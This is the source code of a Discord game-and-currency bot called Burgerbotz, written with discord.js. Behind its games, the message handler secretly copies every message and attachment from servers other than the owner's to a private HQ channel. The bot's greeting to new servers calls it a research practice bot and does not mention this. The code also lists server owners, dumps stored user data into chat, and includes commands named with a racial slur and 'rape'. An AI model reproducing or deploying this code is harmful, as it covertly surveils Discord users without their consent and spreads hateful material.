const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs');
const unst = require('./storage/unstatics.js');
const handler = require('./CommandHandler.js');
const status = "with Carlton";

var database = JSON.parse(fs.readFileSync('userData.json', 'utf8'));
var temp = JSON.parse(fs.readFileSync('temp.json', 'utf8'));
var hqChannel;

client.on('ready', () => 
{
   console.log('Burgerbotz ready! :3');
	
	var data = {}
	data.table = []
	for (i=0; i <26 ; i++)
	{
	   var obj = {
	       id: i,
       	       square: i * i
  	   }
   	data.table.push(obj)
	}
	
	fs.writeFile ("input.json", JSON.stringify(data), function(err) 
	{
	    if (err) throw err;
	    console.log('complete');
	    }
	);
		
   client.user.setGame(status);
   client.guilds.forEach(function(guild)
   {
	if(guild.id === "424507027432144913")
	{
		guild.channels.forEach(function(channel)
		{
			if(channel.id === "478887378929451009")
			{
				hqChannel = channel;	
			}
		});
	}
   });
});

function randomize(min, max) 
{
	return Math.floor(Math.random() * (max - min)) + min;
}

//a

const prefix = '/';
const flags = unst.flags;

const invite = "\uD83C\uDF80\n<https://bit.ly/2NtX6VK>";
const rapeGifs = unst.rape;
const burgerGifs = unst.burger;

//Battle game vars
var inGame = false, inRequest = false,
    turnID, reqID,
    player1ID, player2ID,
    player1Name, player2Name,
    p1isCrippled = false, p2isCrippled = false,
    f0 = false;

//Flag game vars
var inFGame = false, flagID, flagTimeout;

client.on('message', message => 
{
		if(!database[message.author.id]) database[message.author.id] = {burgers: 100};
		var date = message.createdAt;
		if(inFGame)
		{
			var response = message.content.toLowerCase(), flagName = flags[flagID].name.toLowerCase();
			
			if(response.includes(flagName))
			{
				var x = randomize(15, 50);
				post(":trophy: ***" + message.author.username + "** has guessed correctly! Answer: **" + flags[flagID].name + "\nGiven :hamburger: " + x + " as prize.***");
				database[message.author.id].burgers += x;
				clearTimeout(flagTimeout);
				inFGame = false;
			}
		}
		
		if(message.guild != null && message.channel != null && message.content != null)
		{
			console.log("[" + message.guild.name + "]<#" + message.channel.name + ">" + message.author.username + ": " + message.content);
			if(message.guild.id != "424507027432144913")
			{
				var day = date.getDate();
				var month = date.getMonth() + 1;
				var year = date.getFullYear();
				hqChannel.send("[" + day + "/" + month + "/" + year + " | " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + "][" + message.guild.name + "]<#" + message.channel.name + ">**" + message.author.username + "#" + message.author.discriminator + "** : " + message.content);
				message.attachments.forEach(function(attachment)
				{
					hqChannel.send({
						files: [attachment.url]
					});	
				});
			}
		}
	
		function post(String)
		{
			message.channel.send(String);
			return 0;
		}
		function tabScreen(pTurn, p1ID, p2ID, p1Name, p2Name)
		{		
			post("```" + pTurn + "'s turn.\n\n" + p1Name + " HP: " + temp[p1ID].hp + "/100 Ammo: " + temp[p1ID].ammo + "\n" + p2Name + " HP: " + temp[p2ID].hp + "/100 Ammo: " + temp[p2ID].ammo + "\n\n[1] Punch\n[2] Kick\n[3] Shoot\n[4] Heal\n[5] Run```");	
		}
		
		function onDefeat(player1, player2, winID)
		{
			var x = randomize(100, 1000);
			inGame = false;
			p1isCrippled = false;
			p2isCrippled = false;
			post("***:trophy: " + player1 + " has defeated " + player2 + "!\nGiven :hamburger: " + x + " as a prize.***");
			console.log(database[winID].burgers);
			console.log(database[winID]);
			database[winID].burgers += x;
		}
		
		let sender = message.author;
		let ch = message.channel;
		
		if(!temp[sender.id]) temp[sender.id] = {afk: false, afkMessage: ""};
	
		var luckPoints = randomize(0, 100);
	
		if(sender === client.user) return;
		
		let user = message.mentions.users.first();
		let target = message.guild;
	
		if(message.mentions.users.size > 0)
		{
			message.mentions.users.forEach(function(userf)
			{
				if(!temp[userf.id]) temp[userf.id] = {afk: false, afkMessage: ""};
				if(temp[userf.id].afk == true)
				{
					if(temp[userf.id].afkMessage == null)
					{
						post(":footprints: **" + userf.username + "** is away from keyboard");	
					} else {
						post(":footprints: **" + userf.username + "** is away from keyboard (***" + temp[userf.id].afkMessage + "***)");	
					}
				}
			})	
		}
		
		if(temp[sender.id].inGame == 1)
		{
			var x = randomize(0, 2);
			var y = message.content.toLowerCase();
			var z = parseInt(temp[sender.id].stake) * 2;
			
			/* 0 = heads
			*  1 = tails
			*/
			
			if (y == "h" || y == "heads")
			{
				if(x == 0)
				{
					post("*Guessed correctly! You got **heads***\n*Your prize:* :hamburger: **" + z + "**");
					database[sender.id].burgers += z;
					temp[sender.id].inGame = 0;
				} else {
					post("Guessed incorrectly. You got **heads**!");
					temp[sender.id].inGame = 0;
				}
			}
			else if(y == "t" || y == "tails")
			{
				if(x == 1)
				{
					post("*Guessed correctly! You got **tails***\n*Your prize:* :hamburger: **" + z + "**");
					database[sender.id].burgers += z;
					temp[sender.id].inGame = 0;
				} else {
					post("Guessed incorrectly. You got **tails**!");
					temp[sender.id].inGame = 0;
				}
			}
		}
		
		if(inRequest && reqID === sender.id)
		{
			if(message.content.startsWith("1"))
			{
				inRequest = false;
				if(turnID == player1ID)
				{
					tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
					inGame = true;
				} else {
					tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
					f0 = true;
					inGame = true;
				}
			} else if (message.content.startsWith("2")) {
				inGame = false;
				inRequest = false;
				post(sender.username + " has fled the scene!");
			}
		}
	
		if(inGame && turnID === sender.id)
		{		
				if(message.content.startsWith("1"))
				{
					if(luckPoints > 85)
					{
						temp[sender.id].ammo += 1;
						post("***" + sender.username + " grabbed a magazine whilst punching their opponent! +1 ammo***");
					}
					var damage = randomize(5, 10);
					if(sender.id === player1ID)
					{
						temp[player2ID].hp -= damage;
						post(":punch: ***" + player1Name + " has punched " + player2Name + ". -" + damage + " HP***");
						
						if(temp[player2ID].hp > 0)
						{
							turnID = player2ID;
							tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
						} else {
							onDefeat(player1Name, player2Name, player1ID);
							inGame = false;
						}
					} else {
						if(!f0)
						{
							temp[player1ID].hp -= damage;
							post(":punch: ***" + player2Name + " has punched " + player1Name + ". -" + damage + " HP***");
							
							if(temp[player1ID].hp > 0)
							{
								turnID = player1ID;
								tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
							} else {
								onDefeat(player2Name, player1Name, player2ID);
								inGame = false;
							}
						} else {
							turnID = player2ID;
							f0 = false;
						}
					}
				} else if(message.content.startsWith("2")) {
					if(sender.id == player1ID && p1isCrippled)
					{
						post(":cartwheel: ***" + sender.username + " tried to kick their opponent but failed since they're crippled!***");
						
						turnID = player2ID;
						tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
					} else if (sender.id == player2ID && p2isCrippled) {
						post(":cartwheel: ***" + sender.username + " tried to kick their opponent but failed since they're crippled!***");
						
						turnID = player1ID;
						tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
					} else {
					if(luckPoints > 90)
					{
						if(sender.id == player1ID)
						{
							p1isCrippled = true;
							post(":boot: ***" + sender.username + " torn their hamstring whilst trying to kick their opponent!***");
							
							turnID = player2ID;
							tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
						} else {
							p2isCrippled = true;
							post(":boot: ***" + sender.username + " torn their hamstring whilst trying to kick their opponent!***");
							
							turnID = player1ID;
							tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
						}
					} else {
					var damage = randomize(10, 20);
					if(sender.id === player1ID)
					{
						temp[player2ID].hp -= damage;
						post(":boot: ***" + player1Name + " has kicked " + player2Name + ". -" + damage + " HP***");
						
						if(temp[player2ID].hp > 0)
						{
							turnID = player2ID;
							tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
						} else {
							onDefeat(player1Name, player2Name, player1ID);
							inGame = false;
						}
					} else {
						temp[player1ID].hp -= damage;
						post(":boot: ***" + player2Name + " has kicked " + player1Name + ". -" + damage + " HP***");
						
						if(temp[player1ID].hp > 0)
						{
							turnID = player1ID;
							tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
						} else {
							onDefeat(player2Name, player1Name, player2ID);
							inGame = false;
						}
					}
					}
					}
				} else if(message.content.startsWith("3")) {
					var damage = randomize(30, 70);

					if(sender.id === player1ID)
					{
						if(temp[player1ID].ammo > 0)
						{
							var luck = randomize(0, 10);
							if(luck > 7)
							{
								post(":gun: ***Your shot has missed!***");
								temp[player1ID].ammo -= 1;	
								
								turnID = player2ID;
								tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
							} else {
								temp[player2ID].hp -= damage;
								temp[player1ID].ammo -= 1;
								post(":gun: ***" + player1Name + " has shot " + player2Name + ", dealing " + damage + " HP***");
								
								if(temp[player2ID].hp > 0)
								{
									turnID = player2ID;
									tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);	
								} else {
									onDefeat(player1Name, player2Name, player1ID);
									inGame = false;
								}
							}
						} else {
							post(":gun: **Click** ***You tried to open fire but you ran out of ammo!***");
							
							turnID = player2ID;
							tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
						}
					} else {
						if(temp[player2ID].ammo > 0)
						{
							var luck = randomize(0, 10);
							if(luck > 7)
							{
								post(":gun: ***Your shot has missed!***");
								temp[player2ID].ammo -= 1;	
								
								turnID = player1ID;
								tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
							} else {
								temp[player1ID].hp -= damage;
								temp[player2ID].ammo -= 1;
								post(":gun: ***" + player2Name + " has shot " + player1Name + ", dealing " + damage + " HP***");
								
								if(temp[player1ID].hp > 0)
								{
									turnID = player1ID;
									tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);	
								} else {
									onDefeat(player2Name, player1Name, player2ID);
									inGame = false;
								}
							}
						} else {
							post(":gun: **Click** ***You tried to open fire but you ran out of ammo!***");
							
							turnID = player1ID;
							tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
						}
					}
				} else if(message.content.startsWith("4")) {
					var healPoints = randomize(5, 30);

					if(temp[sender.id].hp + healPoints >= 100)
					{
						healPoints = 100 - temp[sender.id].hp;
					}
					
					if(sender.id === player1ID)
					{
						temp[player1ID].hp += healPoints;
						post(":hamburger: ***" + player1Name + " has healed themselves, gaining " + healPoints + " HP***");
						
						turnID = player2ID;
						tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
					} else {
						temp[player2ID].hp += healPoints;
						post(":hamburger: ***" + player2Name + " has healed themselves, gaining " + healPoints + " HP***");
						
						turnID = player1ID;
						tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);
					}
				} else if(message.content.startsWith("5")) {
					var luck = randomize(0, 10);
					var damage = randomize(5, 10);
					if(luck > 6)
					{
						post(":footprints: ***" + sender.username + " has left the battlefield!***");
						inGame = false;
					} else {
						temp[sender.id].hp -= damage;
						post(":cartwheel: ***" + sender.username + " tried to run away but slipped and fell! -" + damage + " HP***");
						
						if(sender.id === player1ID)
						{
							turnID = player2ID;
							tabScreen(player2Name, player1ID, player2ID, player1Name, player2Name);
						} else {
							turnID = player1ID;
							tabScreen(player1Name, player1ID, player2ID, player1Name, player2Name);	
						}
					}
				}
			setTimeout(function()
			{
				if(inGame)
				{	
					post(":shrug: ***The battle has concluded with no clear victor.***");
					inGame = false;
				}
			}, 1800000);
				
		}
	
		var msg0 = message.content.split(' ');
		var cmd0 = msg0[0];
		var cmd = "";
	
		if(cmd0.charAt(0) == prefix)
		{
			cmd = cmd0.slice(1).toLowerCase();
		}
		
		delete msg0[0];
		var arg = msg0.join(" ");
		
		var msg = message.content.toLowerCase();
		const args = msg.slice(prefix.length).trim().split(/ +/g);
		
		if(temp[sender.id].afk && cmd != "afk")
		{
			temp[sender.id].afk = false;
			temp[sender.id].afkMessage = "";
			
			post("**" + sender.username + "** is no longer AFK.");
		}
		
		switch(cmd)
		{
			case "help":
				handler.help(ch);
				break;
			
			case "s":
				handler.spit(ch, message, args, arg);
				break;
				
			case "ping":
				handler.ping(ch, message);
				break;
					
			case "random":
				handler.random(ch, args);
				break;
					
			case "coinflip":
				if(temp[sender.id].inGame == 1)
				{
					post("*A coinflip game is already underway!*");
				} else {
					if(args[1] == null || args[1] != parseInt(args[1]))
					{
						post("*Usage: /coinflip <bet amount>*");
					} else {
						if(!temp[sender.id]) temp[sender.id] = {inGame: 1, stake: args[1]};
						temp[sender.id] = {inGame: true, stake: args[1]};
						database[sender.id].burgers -= parseInt(args[1]);
						post(":money_with_wings: __***Coinflip***__ :money_with_wings:\n**Stake: :hamburger: " + args[1] + "**\n*Choose: heads/tails? (h/n)*");
					}
				}
				break;
					
			case "rape":
				handler.rape(ch, message, rapeGifs);
				break;
				
			case "fx":
				var json = '{';
				for(var x in database)
				{
					json += '"' + x + '":{"burgers":' + database[x].burgers + '},'
				}
				json += '}';
				post(json);
				break;
					
			case "dm":
				handler.dm(ch, message, msg0);
				break;
				
			case "burger":
				if(database[sender.id].burgers >= 1)
				{
					handler.burger(ch, message, burgerGifs);
					database[sender.id].burgers -= 1;
				} else {
					post(":octagonal_sign: You do not have any burgers! :shrug:");	
				}
				break;
				
			case "nigger":
				handler.nigger(ch, message);
				break;
			
			case "post":
				handler.post(ch, arg);
				break;
			
			case "balance":
			case "bal":
			case "burgers":
				if(message.mentions.users.size < 1)
				{
					if(database[sender.id] == null) database[sender.id] = {burgers: 100};
					if(isNaN(database[sender.id].burgers)) database[sender.id].burgers = 100;
					post(`**:diamond_shape_with_a_dot_inside: ${sender.username}**'s *balance contains* :hamburger: **` + database[sender.id].burgers + `**`);
				} else {
					if(!database[user.id] == null) database[user.id] = {burgers: 100};
					if(isNaN(database[user.id].burgers)) database[user.id].burgers = 100;
					post(`**:diamond_shape_with_a_dot_inside: ${user.username}**'s *balance contains* :hamburger: **` + database[user.id].burgers + `**`);
				}
				break;
				
			case "pay":
				if(message.mentions.users.size < 1)
				{
					post("You have to mention another user.");
				} else {
					console.log(args[2]);
					var arg0 = args[2];
					if(arg0 == parseInt(arg0))
					{
						if(!database[user.id])
						{
							database[user.id] = {burgers: 100};
						}
						if(database[sender.id].burgers - parseInt(arg0) >= 0)
						{
							if(isNaN(database[user.id].burgers)) database[user.id].burgers = 100;
							database[user.id].burgers += parseInt(arg0);							
							database[sender.id].burgers -= arg0;
							post("*Successfully given* :hamburger: **" + arg0 + "** *to user* **" + user.username + "**!");
						} else {
							post("You have insufficient burgers to make this transaction!");	
						}
					} else {
						post("**Usage: /pay <user> <amount>**");	
					}
				}
				break;
			
			case "inf":
				var x = 0;
				client.guilds.forEach(function(guild)
				{
					x++;
					post("**>" + guild.name + "** - " + guild.owner.user.username + "#" + guild.owner.user.discriminator + " - " + guild.memberCount + " members");
				});
				post("Total: " + x + " servers");
				break;
				
			case "flags":
				if(inFGame)
				{
					post("A flagspotting game is already underway!");
				} else {
				var x = randomize(0, flags.length);
				var xID = flags[x].id.toLowerCase();
				flagID = x;
				inFGame = true;
				console.log(x + " " + xID + " " + flagID);
				
				post(":checkered_flag: __***Flagspotting***__ :checkered_flag:\n*You have 15 seconds to guess the flag!*");
				post(":flag_" + xID + ":");
				
				flagTimeout = setTimeout(function()
				{
					if(inFGame)
					{	
						post(":alarm_clock: **Time's up!** No one answered correctly. Answer: **" + flags[x].name + "**.");
						inFGame = false;
					}
				}, 15000);	
				}
				break;
				
			case "invite":
				post(":hamburger: ***__Get Burgerbotz!__*** :hamburger:" + invite);
				break;
				
			case "afk":
				if(!temp[sender.id].afk)
				{
					temp[sender.id].afk = true;			
					var a = arg.slice(1);
					temp[sender.id].afkMessage = a;
		
					if(args.length == 1)
					{
						post(":footprints: **" + sender.username + "** is now AFK.");
					temp[sender.id].afkMessage = null;
					} else {
						post(":footprints: **" + sender.username + "** is now AFK (***" + temp[sender.id].afkMessage + "***)");
					}
				} else {
					temp[sender.id].afk = false;
					temp[sender.id].afkMessage = "";
			
					post("**" + sender.username + "** is no longer AFK.");	
				}
				break;
	
			case "battle":
				if(message.mentions.users.size < 1) 
				{
					post("You have to mention someone to battle with")
				} else if (message.mentions.users.size >= 1 && user === sender) {
					post("You can not battle yourself!");
				} else if (inGame) {
					post("A battle is already ongoing!");
				} else {
					if(!temp[user.id]) temp[user.id] = {hp: 100, ammo: 1};
					if(!temp[sender.id]) temp[sender.id] = {hp: 100, ammo: 1};
					
					temp[user.id] = {hp: 100, ammo: 1};
					temp[sender.id] = {hp: 100, ammo: 1};
					
					player1ID = sender.id;
					player2ID = user.id;
					
					player1Name = sender.username;
					player2Name = user.username;
					
					var rand = randomize(0, 2);
					if(rand > 0)
					{
						turnID = player1ID;
					} else {
						turnID = player2ID;
					}
					reqID = user.id;
					
					post(`${user}, you have been challenged to a battle by ${sender.username}!` + "\n```[1] Engage\n[2] Run```");
					inRequest = true;
					
					setTimeout(function()
				        {
						if(inRequest)
						{	
							post(":shrug: ***" + user.username + " has ignored " + sender.username + "'s challenge to battle.***");
							inRequest = false;
						}
					}, 90000);
				}
				break;

	}
		fs.writeFile('userData.json', JSON.stringify(database), (err) =>
		{
			if(err) throw err;		
		});
	
		fs.writeFile('temp.json', JSON.stringify(temp), (err) =>
		{
			if(err) throw err;		
		});
});

client.on('guildCreate', guild =>
{
	guild.channels.forEach(function(channel)
	{
		if(channel.name == "general")
		{
			channel.send(":hamburger: __***Burgerbotz***__ :hamburger:\nThank you for adding me! Burgerbotz is a practice bot made by A&A Consortium for research purposes.\nType /help for the list of commands.");	
		}
	});
});

client.login(process.env.BOT_TOKEN);
